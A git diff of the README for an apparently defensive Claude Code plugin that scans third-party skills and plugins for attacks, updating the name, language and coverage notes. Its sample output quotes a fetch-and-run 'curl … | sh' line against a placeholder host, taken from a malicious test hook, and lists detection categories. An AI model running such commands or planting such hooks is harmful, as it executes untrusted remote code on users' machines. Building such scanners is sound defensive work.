@@ -1,4 +1,4 @@
-# instict
+# instinct
 
 **English** · [Українська](README.uk.md)
 
@@ -8,8 +8,8 @@ It currently ships one skill: **how-deep-the-rabbit-hole-goes**, a security audi
 plugins that you run *before* you install or use someone else's.
 
 > [!NOTE]
-> The skill's instructions, the threat catalog and the scanner's output are written in Ukrainian.
-> The scanner's detection rules cover both English and Ukrainian text.
+> The skill, the threat catalog and the scanner's output are in English; the agent writes its report in
+> the user's language. The scanner's detection rules cover English and Ukrainian text.
 
 ## Why
 
@@ -49,15 +49,15 @@ Requires [Claude Code](https://claude.com/claude-code). The scanner also needs
 which runs on Windows, macOS and Linux.
 
 ```bash
-claude plugin marketplace add <owner>/instict
+claude plugin marketplace add <owner>/instinct
 ```
 
 ```bash
-claude plugin install instict@instict
+claude plugin install instinct@instinct
 ```
 
-To install from a local clone, pass the folder path instead of `<owner>/instict`. After pulling new
-changes, run `claude plugin marketplace update instict`.
+To install from a local clone, pass the folder path instead of `<owner>/instinct`. After pulling new
+changes, run `claude plugin marketplace update instinct`.
 
 ## Use
 
@@ -88,24 +88,29 @@ pwsh -NoProfile -File skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Pat
 | `-Inventory` | Also list every file with its type and hash. |
 
 Exit code `2` means at least one CRITICAL finding, `1` means at least one HIGH, `0` means neither.
+Exit 0 is not a clean bill of health. Check `ScanComplete` and `CoverageIssues` for skipped, opaque or
+limited content. JSON schema 2 adds `Components` with parsed command/argument candidates. Tree-hash
+version 2 includes file types and link destinations and cannot be compared with older hashes;
+`TreeHashComplete: false` returns a null hash.
 
 Abridged output for one of the bundled malicious test samples:
 
 ```text
 [CRITICAL] T05 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
-[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (перенаправлення API-трафіку агента …)
-[HIGH] T21 hooks/hooks.json  (хуки плагіна: команди запускаються автоматично на події агента)
-[HIGH] T12 skills/code-reveiw/SKILL.md:2  (назва майже збігається з вбудованим скілом (typosquatting))
-[MEDIUM] T11 .claude-plugin/marketplace.json  (плагін із зовнішнього джерела без зафіксованого sha …)
+[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (redirects the agent's API traffic …)
+[HIGH] T12 skills/code-reveiw/SKILL.md:2  (name nearly matches a built-in skill (typosquatting))
+[HIGH] T21 hooks/hooks.json  (plugin hooks: commands run automatically on agent events)
+[MEDIUM] T11 .claude-plugin/marketplace.json  (plugin from an external source without a pinned sha …)
 
-Підсумок: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
+Summary: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
 ```
 
 Beyond line-by-line pattern matching, the scanner:
 
 - joins continued lines, so a `curl … | sh` split across lines is still one command;
 - re-runs its rules after Unicode normalization, which catches homoglyphs and invisible characters;
-- decodes base64 blocks and checks the decoded text;
+- decodes two bounded layers of base64, normalizes and checks the decoded text;
+- decodes BOM-tagged UTF-16/32 and parses JSON keys, commands and argument arrays without executing them;
 - looks for text and trailing data inside image files;
 - inspects plugin structure: hooks, MCP and LSP configuration, `bin/`, marketplace sources, a nested `.git`;
 - records a hash of the whole tree, so a verdict is tied to the exact version that was audited.
@@ -118,13 +123,24 @@ Beyond line-by-line pattern matching, the scanner:
   polite language are only caught by reading them.
 - Text drawn into the pixels of an image is not analyzed. Binaries, archives and office documents are
   flagged but not opened.
-- Text-based rules are written for English and Ukrainian.
+- Text-based rules are written for English and Ukrainian. Instructions in other languages, and scripts
+  in languages other than Python, JavaScript/TypeScript, PowerShell and shell, are mostly invisible to
+  the scanner; the skill tells the agent to read such targets in full by hand.
 - A verdict applies only to the audited version. Re-audit after every update.
 
 ## Repository layout
 
+Unsupported encodings, parser/regex limits, inaccessible files and image pixels are recorded as
+coverage gaps. Symlinks and root junctions are not followed. See the maintained
+[coverage contract and CWE/OWASP map](skills/how-deep-the-rabbit-hole-goes/references/coverage.md).
+
+Version 0.8.0 refines private-transfer, approval-bypass, persistence and concealed-output signals.
+Narrow context checks reduce warnings on explicit prohibitions and literal examples; later dangerous
+actions on the same line still take precedence. These are review heuristics, not authorization or
+data-flow analysis. The frozen development corpus and unscored holdout remain separate from regressions.
+
 ```
-instict/
+instinct/
 ├── .claude-plugin/        plugin and marketplace manifests
 ├── skills/                one folder per skill, each with a SKILL.md
 ├── tests/                 test samples and regression tests
@@ -163,13 +179,20 @@ Conventions:
 
 - `name` is kebab-case, at most 64 characters, and matches the folder name.
 - `description` is at most 1024 characters and says what the skill does and when to use it, with the
-  phrases a user would actually type, in Ukrainian and English.
+  phrases a user would actually type. Skills are written in English; Ukrainian trigger phrases may be
+  added so the skill also activates on them.
 - Keep `SKILL.md` short; move long reference material to `references/`.
 - A new scanner rule comes with a catalog entry and a test: a malicious sample that triggers it, while
   `benign-skill` stays at LOW or below.
 - Run any borrowed skill through `how-deep-the-rabbit-hole-goes` before adding it.
 
 ## Reporting a problem
+
+The regression runner also generates safe synthetic probes for evasions, negative controls and scanner
+robustness. Fixtures are read, never executed. Link probes explicitly skip if the host prevents creating
+links; verify them on a capable host. Save per-case measurements with
+`security-regressions.ps1 -ReportPath <file>`; use `-MeasureOnly -Scanner <old scan.ps1>` for a baseline.
+These focused regression metrics are not real-world precision or recall estimates.
 
 If the scanner misses an attack pattern or raises a false alarm, open an issue with a minimal sample.
 Keep samples inert: use `example.invalid` and never include real credentials or working payloads.
